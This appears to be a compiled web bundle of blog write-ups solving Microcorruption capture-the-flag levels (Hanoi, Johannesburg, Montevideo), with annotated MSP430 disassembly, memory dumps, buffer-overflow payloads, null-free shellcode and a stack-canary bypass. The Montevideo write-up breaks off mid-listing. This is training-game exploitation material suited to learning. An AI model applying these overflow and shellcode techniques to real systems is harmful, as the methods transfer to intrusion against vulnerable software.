<span class="line"><span style="color:#79C0FF">4450</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">3041</span><span style="color:#FF7B72">           ret</span></span></code></pre>`);var p=a(o,4);n(p,()=>'<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab</span></span></code></pre>');var t=a(p,4);n(t,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#79C0FF">4500</span><span style="color:#E6EDF3"> &#x3C;login></span></span>
<span class="line"><span style="color:#79C0FF">4500</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">3150</span><span style="color:#E6EDF3"> f0ff      </span><span style="color:#FF7B72">add</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0xfff0</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">sp</span></span>
<span class="line"><span style="color:#E6EDF3">...</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">453e:</span><span style="color:#79C0FF">  3041</span><span style="color:#FF7B72">           ret</span><span style="color:#8B949E">                ; add a breakpoint here</span></span></code></pre>`);var r=a(t,4);n(r,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>sp: 43fe</span></span>
<span class="line"><span>43d0: 0000 0000 0000 0000 0000 0000 5645 0100   ............VE..</span></span>
<span class="line"><span>43e0: 5645 0300 ca45 0000 0a00 0000 3a45 aa0a   VE...E......:E..</span></span>
<span class="line"><span>43f0: a1aa 2aa3 aa4a a5aa 6aa7 aa8a a9ab 0ab1   ..*..J..j.......</span></span>
<span class="line"><span>4400: ab2a b3ab 4ab5 ab00 75f3 35d0 085a 3f40   .*..J...u.5..Z?@</span></span></code></pre>`);var c=a(r,4);n(c,()=>'<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>(0x00)*32 + 0x4644 = 000000000000000000000000000000004644</span></span></code></pre>'),S(2),g(e,s)}const ba=Object.freeze(Object.defineProperty({__proto__:null,default:zs,metadata:Ns},Symbol.toStringTag,{value:"Module"})),Ws={title:"Microcorruption Hanoi",date:"2025-02-03T04:00:00",description:"The process and solution for the third Microcorruption level",categories:["microcorruption","reversing","pwn"]};var Us=B('<p>Here is the manual for Microcorruption which we will need for this challenge:</p> <ul><li>Manual: <a href="https://microcorruption.com/public/manual.pdf" rel="nofollow">https://microcorruption.com/public/manual.pdf</a></li></ul> <p>Additionally, the MSP430 specific booklets:</p> <ul><li>User Guide: <a href="https://www.ti.com/lit/ug/slau049f/slau049f.pdf" rel="nofollow">https://www.ti.com/lit/ug/slau049f/slau049f.pdf</a></li> <li>ABI: <a href="https://www.ti.com/lit/an/slaa534a/slaa534a.pdf" rel="nofollow">https://www.ti.com/lit/an/slaa534a/slaa534a.pdf</a></li></ul> <p>Alright, when we select this challenge we are given some new information:</p> <!> <p>It also appears the main function has also changed significantly. It is now just calling a function login:</p> <!> <p>Looking through the login function we can determine that the unlock door function will be called if the value at the address 2410 is 0x9a. We also need to ensure the test_password_valid function returns 0 into r15.</p> <!> <p>So we know that we can overflow the address 2410, as the input we supply is not checked for length. That solved our first problem. However, we now need to find a way to make test_password_valid return zero.</p> <!> <p>After analyzing test_password_valid, it looks like r15 is an error checking component that will return 0 under normal circumstance. Putting this all together, we can use the following payload to solve this challenge remembering to check the box for hex input.</p> <!>',1);function $s(e){var s=Us(),l=a(b(s),10);n(l,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>LockIT Pro Hardware  Security Module 1 stores  the login password,</span></span>
<span class="line"><span>ensuring users  can not access  the password through  other means.</span></span>
<span class="line"><span>The LockIT Pro  can send the LockIT Pro HSM-1  a password, and the</span></span>
<span class="line"><span>HSM will  return if the password  is correct by setting  a flag in</span></span>
<span class="line"><span>memory.</span></span>
<span class="line"><span></span></span>
<span class="line"><span>This is Hardware  Version B.  It contains  the Bluetooth connector</span></span>
<span class="line"><span>built in, and two available  ports: the LockIT Pro Deadbolt should</span></span>
<span class="line"><span>be  connected to  port  1,  and the  LockIT  Pro  HSM-1 should  be</span></span>
<span class="line"><span>connected to port 2.</span></span>
<span class="line"><span></span></span>
<span class="line"><span>This is Software Revision 01,  allowing it to communicate with the</span></span>
<span class="line"><span>LockIT Pro HSM-1</span></span></code></pre>`);var o=a(l,4);n(o,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#79C0FF">4438</span><span style="color:#E6EDF3"> &#x3C;main></span></span>
<span class="line"><span style="color:#79C0FF">4438</span><span style="color:#E6EDF3">:  b012 </span><span style="color:#79C0FF">2045</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4520</span><span style="color:#E6EDF3"> &#x3C;login></span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">443c:</span><span style="color:#E6EDF3">  0f43           clr	</span><span style="color:#79C0FF">r15</span></span></code></pre>`);var p=a(o,4);n(p,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#79C0FF">4520</span><span style="color:#E6EDF3"> &#x3C;login></span></span>
<span class="line"></span>
<span class="line"><span style="color:#79C0FF">4520</span><span style="color:#E6EDF3">:  c243 </span><span style="color:#79C0FF">1024</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">.b	#</span><span style="color:#79C0FF">0x0</span><span style="color:#E6EDF3">, &#x26;</span><span style="color:#79C0FF">0x2410</span><span style="color:#8B949E">                                       ; move 0 (1 byte) into memory address 2410 (string terminator)</span></span>
<span class="line"><span style="color:#79C0FF">4524</span><span style="color:#E6EDF3">:  3f40 </span><span style="color:#79C0FF">7e44</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x447e</span><span style="color:#E6EDF3"> "</span><span style="color:#FF7B72">Enter</span><span style="color:#E6EDF3"> the password to continue.", </span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">      ; move address 447e into register r15</span></span>
<span class="line"><span style="color:#79C0FF">4528</span><span style="color:#E6EDF3">:  b012 de45      </span><span style="color:#FF7B72">call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x45de</span><span style="color:#E6EDF3"> &#x3C;puts>                                      </span><span style="color:#8B949E">; print to screen</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">452c:</span><span style="color:#E6EDF3">  3f40 </span><span style="color:#79C0FF">9e44</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x449e</span><span style="color:#E6EDF3"> "</span><span style="color:#D2A8FF">Remember:</span><span style="color:#E6EDF3"> passwords are between </span><span style="color:#79C0FF">8</span><span style="color:#FF7B72"> and</span><span style="color:#79C0FF"> 16</span><span style="color:#E6EDF3"> characters.", </span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">    ; move address 449e into r15</span></span>
<span class="line"><span style="color:#79C0FF">4530</span><span style="color:#E6EDF3">:  b012 de45      </span><span style="color:#FF7B72">call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x45de</span><span style="color:#E6EDF3"> &#x3C;puts>                                      </span><span style="color:#8B949E">; print to screen</span></span>
<span class="line"><span style="color:#79C0FF">4534</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">3e40</span><span style="color:#E6EDF3"> 1c00      </span><span style="color:#FF7B72">mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x1c</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r14</span><span style="color:#8B949E">                                          ; move 0x1c into register r14</span></span>
<span class="line"><span style="color:#79C0FF">4538</span><span style="color:#E6EDF3">:  3f40 </span><span style="color:#79C0FF">0024</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x2400</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">                                        ; move address 2400 into register r15</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">453c:</span><span style="color:#E6EDF3">  b012 ce45      </span><span style="color:#FF7B72">call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x45ce</span><span style="color:#E6EDF3"> &#x3C;getsn>                                     </span><span style="color:#8B949E">; put user input [string] into memory address (should be terminated at 2410)</span></span>
<span class="line"><span style="color:#79C0FF">4540</span><span style="color:#E6EDF3">:  3f40 </span><span style="color:#79C0FF">0024</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x2400</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">                                        ; reset register r15 to the beginning of the user input</span></span>
<span class="line"><span style="color:#79C0FF">4544</span><span style="color:#E6EDF3">:  b012 </span><span style="color:#79C0FF">5444</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4454</span><span style="color:#E6EDF3"> &#x3C;test_password_valid>                       </span><span style="color:#8B949E">; r15 is the parameter passed to the test_password_valid function</span></span>
<span class="line"><span style="color:#79C0FF">4548</span><span style="color:#E6EDF3">:  0f93           tst	</span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">                                                 ; r15 is also the output</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">454a:</span><span style="color:#79C0FF">  0324</span><span style="color:#FF7B72">           jz</span><span style="color:#E6EDF3">	$+</span><span style="color:#79C0FF">0x8</span><span style="color:#E6EDF3"> &#x3C;login+</span><span style="color:#79C0FF">0x32</span><span style="color:#E6EDF3">>                                  </span><span style="color:#8B949E">; if r15 is zero, then jump to 4552 (skipping the next line)</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">454c:</span><span style="color:#E6EDF3">  f240 a800 </span><span style="color:#79C0FF">1024</span><span style="color:#FF7B72"> mov</span><span style="color:#E6EDF3">.b	#</span><span style="color:#79C0FF">0xa8</span><span style="color:#E6EDF3">, &#x26;</span><span style="color:#79C0FF">0x2410</span><span style="color:#8B949E">                                      ; set the value at 2410 to 0xa8</span></span>
<span class="line"><span style="color:#79C0FF">4552</span><span style="color:#E6EDF3">:  3f40 d344      </span><span style="color:#FF7B72">mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x44d3</span><span style="color:#E6EDF3"> "Testing if password is valid.", </span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">        ; put a string location into r15</span></span>
<span class="line"><span style="color:#79C0FF">4556</span><span style="color:#E6EDF3">:  b012 de45      </span><span style="color:#FF7B72">call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x45de</span><span style="color:#E6EDF3"> &#x3C;puts>                                      </span><span style="color:#8B949E">; and print it</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">455a:</span><span style="color:#E6EDF3">  f290 9a00 </span><span style="color:#79C0FF">1024</span><span style="color:#FF7B72"> cmp</span><span style="color:#E6EDF3">.b	#</span><span style="color:#79C0FF">0x9a</span><span style="color:#E6EDF3">, &#x26;</span><span style="color:#79C0FF">0x2410</span><span style="color:#8B949E">                                      ; check if the value at address 2410 is 0x9a (notice if we were wrong about the password this address was set by)</span></span>
<span class="line"><span style="color:#79C0FF">4560</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">0720</span><span style="color:#FF7B72">           jnz</span><span style="color:#E6EDF3">	$+</span><span style="color:#79C0FF">0x10</span><span style="color:#E6EDF3"> &#x3C;login+</span><span style="color:#79C0FF">0x50</span><span style="color:#E6EDF3">>                                 </span><span style="color:#8B949E">; if they are not equal jump to address 4570</span></span>
<span class="line"><span style="color:#79C0FF">4562</span><span style="color:#E6EDF3">:  3f40 f144      </span><span style="color:#FF7B72">mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x44f1</span><span style="color:#E6EDF3"> "Access granted.", </span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">                      ; put a string address into r15</span></span>
<span class="line"><span style="color:#79C0FF">4566</span><span style="color:#E6EDF3">:  b012 de45      </span><span style="color:#FF7B72">call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x45de</span><span style="color:#E6EDF3"> &#x3C;puts>                                      </span><span style="color:#8B949E">; print that string</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">456a:</span><span style="color:#E6EDF3">  b012 </span><span style="color:#79C0FF">4844</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4448</span><span style="color:#E6EDF3"> &#x3C;unlock_door>                               </span><span style="color:#8B949E">; unlock the door</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">456e:</span><span style="color:#79C0FF">  3041</span><span style="color:#FF7B72">           ret</span><span style="color:#8B949E">                                                           ; return</span></span>
<span class="line"><span style="color:#79C0FF">4570</span><span style="color:#E6EDF3">:  3f40 </span><span style="color:#79C0FF">0145</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4501</span><span style="color:#E6EDF3"> "That password is </span><span style="color:#FF7B72">not</span><span style="color:#E6EDF3"> correct.", </span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">        ; put a string into r15</span></span>
<span class="line"><span style="color:#79C0FF">4574</span><span style="color:#E6EDF3">:  b012 de45      </span><span style="color:#FF7B72">call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x45de</span><span style="color:#E6EDF3"> &#x3C;puts>                                      </span><span style="color:#8B949E">; print that string </span></span>
<span class="line"><span style="color:#79C0FF">4578</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">3041</span><span style="color:#FF7B72">           ret</span><span style="color:#8B949E">                                                           ; return</span></span></code></pre>`);var t=a(p,4);n(t,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#79C0FF">4454</span><span style="color:#E6EDF3"> &#x3C;test_password_valid></span></span>
<span class="line"><span style="color:#79C0FF">4454</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">0412</span><span style="color:#FF7B72">           push</span><span style="color:#E6EDF3">	r4                    </span><span style="color:#8B949E">; store current value of r4 on stack so we can use it</span></span>
<span class="line"><span style="color:#79C0FF">4456</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">0441</span><span style="color:#FF7B72">           mov</span><span style="color:#79C0FF">	sp</span><span style="color:#E6EDF3">, r4                </span><span style="color:#8B949E">; move the stack pointer into r4</span></span>
<span class="line"><span style="color:#79C0FF">4458</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">2453</span><span style="color:#E6EDF3">           incd	r4                    </span><span style="color:#8B949E">; move the pointer in r4 one word (2 bytes) into the stack (reference second to last variable)</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">445a:</span><span style="color:#79C0FF">  2183</span><span style="color:#E6EDF3">           decd	</span><span style="color:#79C0FF">sp</span><span style="color:#8B949E">                    ; add space to the stack, stack grows to lower memory addresses</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">445c:</span><span style="color:#E6EDF3">  c443 fcff      </span><span style="color:#FF7B72">mov</span><span style="color:#E6EDF3">.b	#</span><span style="color:#79C0FF">0x0</span><span style="color:#E6EDF3">, -</span><span style="color:#79C0FF">0x4</span><span style="color:#E6EDF3">(r4)        </span><span style="color:#8B949E">; move a byte of zero into the space we created on the stack (2nd variable on stack)</span></span>
<span class="line"><span style="color:#79C0FF">4460</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">3e40</span><span style="color:#E6EDF3"> fcff      </span><span style="color:#FF7B72">mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0xfffc</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r14</span><span style="color:#8B949E">          ; move address fffc into f14</span></span>
<span class="line"><span style="color:#79C0FF">4464</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">0e54</span><span style="color:#FF7B72">           add</span><span style="color:#E6EDF3">	r4, </span><span style="color:#79C0FF">r14</span><span style="color:#8B949E">               ; this causes an overflow and r14 ends up being 43f8 which is also the stack pointer</span></span>
<span class="line"><span style="color:#79C0FF">4466</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">0e12</span><span style="color:#FF7B72">           push</span><span style="color:#79C0FF">	r14</span><span style="color:#8B949E">                   ; the second argument (the location to write a byte successful)</span></span>
<span class="line"><span style="color:#79C0FF">4468</span><span style="color:#E6EDF3">:  0f12           </span><span style="color:#FF7B72">push</span><span style="color:#79C0FF">	r15</span><span style="color:#8B949E">                   ; the first argument (the location of the password)</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">446a:</span><span style="color:#79C0FF">  3012</span><span style="color:#E6EDF3"> 7d00      </span><span style="color:#FF7B72">push</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x7d</span><span style="color:#8B949E">                 ; we know from the manual this calls the hsm-1 module and checks the password is correct</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">446e:</span><span style="color:#E6EDF3">  b012 7a45      </span><span style="color:#FF7B72">call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x457a</span><span style="color:#E6EDF3"> &#x3C;</span><span style="color:#FF7B72">INT</span><span style="color:#E6EDF3">>         </span><span style="color:#8B949E">; it takes 2 arguments on stack and overwrites a memory location if flag is correct</span></span>
<span class="line"><span style="color:#79C0FF">4472</span><span style="color:#E6EDF3">:  5f44 fcff      </span><span style="color:#FF7B72">mov</span><span style="color:#E6EDF3">.b	-</span><span style="color:#79C0FF">0x4</span><span style="color:#E6EDF3">(r4), </span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">         ; we previously set -0x4(r4) to zero, so set r15 to zero</span></span>
<span class="line"><span style="color:#79C0FF">4476</span><span style="color:#E6EDF3">:  8f11           sxt	</span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">                   ; sign extend r15. in this case, 0 becomes 00</span></span>
<span class="line"><span style="color:#79C0FF">4478</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">3152</span><span style="color:#FF7B72">           add</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x8</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">sp</span><span style="color:#8B949E">              ; return our stack to the previous value of r4, discarding our local variables</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">447a:</span><span style="color:#79C0FF">  3441</span><span style="color:#FF7B72">           pop</span><span style="color:#E6EDF3">	r4                    </span><span style="color:#8B949E">; restore r4</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">447c:</span><span style="color:#79C0FF">  3041</span><span style="color:#FF7B72">           ret</span><span style="color:#8B949E">                         ; return</span></span></code></pre>`);var r=a(t,4);n(r,()=>'<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>(padding)*16 + 0x9a: 000000000000000000000000000000009a</span></span></code></pre>'),g(e,s)}const ga=Object.freeze(Object.defineProperty({__proto__:null,default:$s,metadata:Ws},Symbol.toStringTag,{value:"Module"})),Gs={title:"Microcorruption Johannesburg",date:"2025-03-06T00:00:00",description:"The process and solution for the eight Microcorruption level",categories:["microcorruption","reversing","pwn"]};var Vs=B('<p>Looking at the login function, we see it is very similar to our previous challenge (Montevideo). However, here we get our first taste of a stack canary.</p> <!> <p>Looking at our memory we also see we get 17 bytes (34 nibbles) to work with this time:</p> <!> <p>Lets take our previous shellcode, which is 32 nibbles, recompile it for this challenge (<a href="https://microcorruption.com/assembler" rel="nofollow">https://microcorruption.com/assembler</a>), and tack on the canary:</p> <!> <p>Using this payload defeats the canary and solves the challenge.</p>',1);function Ys(e){var s=Vs(),l=a(b(s),2);n(l,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"></span>
<span class="line"><span style="color:#E6EDF3">452c &#x3C;login></span></span>
<span class="line"><span style="color:#E6EDF3">...</span></span>
<span class="line"><span style="color:#79C0FF">4552</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">3e40</span><span style="color:#79C0FF"> 0024</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x2400</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r14</span></span>
<span class="line"><span style="color:#79C0FF">4556</span><span style="color:#E6EDF3">:  0f41           </span><span style="color:#FF7B72">mov</span><span style="color:#79C0FF">	sp</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span></span>
<span class="line"><span style="color:#79C0FF">4558</span><span style="color:#E6EDF3">:  b012 </span><span style="color:#79C0FF">2446</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4624</span><span style="color:#E6EDF3"> &#x3C;strcpy>         </span><span style="color:#8B949E">; again the use of strcpy leaves this program vulnerable to overflow</span></span>
<span class="line"><span style="color:#E6EDF3">...</span></span>
<span class="line"><span style="color:#79C0FF">4578</span><span style="color:#E6EDF3">:  f190 </span><span style="color:#79C0FF">5000</span><span style="color:#79C0FF"> 1100</span><span style="color:#FF7B72"> cmp</span><span style="color:#E6EDF3">.b	#</span><span style="color:#79C0FF">0x50</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">0x11</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">sp</span><span style="color:#E6EDF3">)          </span><span style="color:#8B949E">; compare the 0x11 (17th) element of our input to 50 and see if its equal</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">457e:</span><span style="color:#79C0FF">  0624</span><span style="color:#FF7B72">           jz</span><span style="color:#E6EDF3">	$+</span><span style="color:#79C0FF">0xe</span><span style="color:#E6EDF3"> &#x3C;login+</span><span style="color:#79C0FF">0x60</span><span style="color:#E6EDF3">>   </span></span>
<span class="line"><span style="color:#E6EDF3">...</span></span></code></pre>`);var o=a(l,4);n(o,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>43d0: 0000 0000 0000 0000 0000 a845 0100 a845   </span></span>
<span class="line"><span>43e0: 0300 1c46 0000 0a00 0000 7845 aaaa 0000   ; start at 43ec</span></span>
<span class="line"><span>43f0: 0000 0000 0000 0000 0000 0000 0050 3c44   ; end at 43fd</span></span>
<span class="line"><span>4400: 3140 0044 1542 5c01 75f3 35d0 085a 3f40</span></span></code></pre>`);var p=a(o,4);n(p,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>xor r15, r15          ; clear out r15</span></span>
<span class="line"><span>mov #0xffff, r15      ; set r15 to max </span></span>
<span class="line"><span>sub #0xff80, r15      ; subtract 0xffff - 0xff80 = 0x007f without any zeros in assembled code</span></span>
<span class="line"><span>push r15              ; put on stack</span></span>
<span class="line"><span>call #0x4594          ; remember interrupt address changes</span></span>
<span class="line"><span></span></span>
<span class="line"><span>shellcode: 0fef3f40ffff3f8080ff0f12b0129445 + ff50 ; 0xff because 0x00 terminates strcpy</span></span>
<span class="line"><span></span></span>
<span class="line"><span>payload: 0fef3f40ffff3f8080ff0f12b0129445ff50 + ec43  ; the address also changes</span></span>
<span class="line"><span>             = 0fef3f40ffff3f8080ff0f12b0129445ff50ec43   </span></span></code></pre>`),S(2),g(e,s)}const Ba=Object.freeze(Object.defineProperty({__proto__:null,default:Ys,metadata:Gs},Symbol.toStringTag,{value:"Module"})),Ks={title:"Microcorruption Montevideo",date:"2025-03-02T00:00:00",description:"The process and solution for the seventh Microcorruption level",categories:["microcorruption","reversing","pwn"]};var Js=B('<p>Looking at this level we notice two new functions, strcpy and memset.</p> <!> <p>We know there is a common issue with strcpy which can lead to an overflow. Looking at the login function we confirm there is no bounds checking and thus strcpy is used in an improper way that will allow us to overflow the stack.</p> <!> <p>Verifying this with an input of <code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code> (hex encoded) does indeed lead to a stack misalignment.</p> <p>From our Whitehorse writeup we know the following shellcode will open the door:</p> <!> <p>However our interrupt is now at 454c. so we need to modify the code to the following</p> <!> <p>We can place this shellcode onto the stack and control the instruction pointer to jump into it because of the strcpy function.</p> <p>We need to find our stack address and the overwrite location. Submitting <code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABDE</code> as the password and stepping, we see the following memory dump:</p> <!> <p>Adding a breakpoint at 4548 and then continuing + one step tells up the <code>pc</code> = <code>00de</code>. Thus the offset is 32. Additionally, we can see the stack address is <code>43ee</code>.</p> <p>Putting these together we get the following shellcode</p> <!> <p>This code doesn’t actually work. Strcpy is actually reading the 00 in 0x007f as the terminator for the string.</p> <p>This possess a problem because we need to push the code 0x007f to open the lock. Lets try and recompile our shellcode to get rid of those zeros. Using the provided disassembler, we come up with the following solution (<a href="https://microcorruption.com/assembler" rel="nofollow">https://microcorruption.com/assembler</a>):</p> <!> <p>Using subtraction of all things, solves this challenge.</p>',1);function Qs(e){var s=Js(),l=a(b(s),2);n(l,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#E6EDF3">45dc &#x3C;strcpy></span></span>
<span class="line"><span style="color:#E6EDF3">...</span></span>
<span class="line"><span style="color:#E6EDF3">45f0 &#x3C;memset></span></span></code></pre>`);var o=a(l,4);n(o,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#E6EDF3">44f4 &#x3C;login></span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">44f4:</span><span style="color:#79C0FF">  3150</span><span style="color:#E6EDF3"> f0ff      </span><span style="color:#FF7B72">add</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0xfff0</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">sp</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">44f8:</span><span style="color:#E6EDF3">  3f40 </span><span style="color:#79C0FF">7044</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4470</span><span style="color:#E6EDF3"> "</span><span style="color:#FF7B72">Enter</span><span style="color:#E6EDF3"> the password to continue.", </span><span style="color:#79C0FF">r15</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">44fc:</span><span style="color:#E6EDF3">  b012 b045      </span><span style="color:#FF7B72">call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x45b0</span><span style="color:#E6EDF3"> &#x3C;puts></span></span>
<span class="line"><span style="color:#79C0FF">4500</span><span style="color:#E6EDF3">:  3f40 </span><span style="color:#79C0FF">9044</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4490</span><span style="color:#E6EDF3"> "</span><span style="color:#D2A8FF">Remember:</span><span style="color:#E6EDF3"> passwords are between </span><span style="color:#79C0FF">8</span><span style="color:#FF7B72"> and</span><span style="color:#79C0FF"> 16</span><span style="color:#E6EDF3"> characters.", </span><span style="color:#79C0FF">r15</span></span>
<span class="line"><span style="color:#79C0FF">4504</span><span style="color:#E6EDF3">:  b012 b045      </span><span style="color:#FF7B72">call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x45b0</span><span style="color:#E6EDF3"> &#x3C;puts></span></span>
<span class="line"><span style="color:#79C0FF">4508</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">3e40</span><span style="color:#79C0FF"> 3000</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x30</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r14</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">450c:</span><span style="color:#E6EDF3">  3f40 </span><span style="color:#79C0FF">0024</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x2400</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span></span>
<span class="line"><span style="color:#79C0FF">4510</span><span style="color:#E6EDF3">:  b012 a045      </span><span style="color:#FF7B72">call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x45a0</span><span style="color:#E6EDF3"> &#x3C;getsn></span></span>
<span class="line"><span style="color:#79C0FF">4514</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">3e40</span><span style="color:#79C0FF"> 0024</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x2400</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r14</span><span style="color:#8B949E">        ; location of password</span></span>
<span class="line"><span style="color:#79C0FF">4518</span><span style="color:#E6EDF3">:  0f41           </span><span style="color:#FF7B72">mov</span><span style="color:#79C0FF">	sp</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">             ; area we have cleared on stack for password</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">451a:</span><span style="color:#E6EDF3">  b012 dc45      </span><span style="color:#FF7B72">call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x45dc</span><span style="color:#E6EDF3"> &#x3C;strcpy>    </span><span style="color:#8B949E">; copy over password to stack.</span></span>
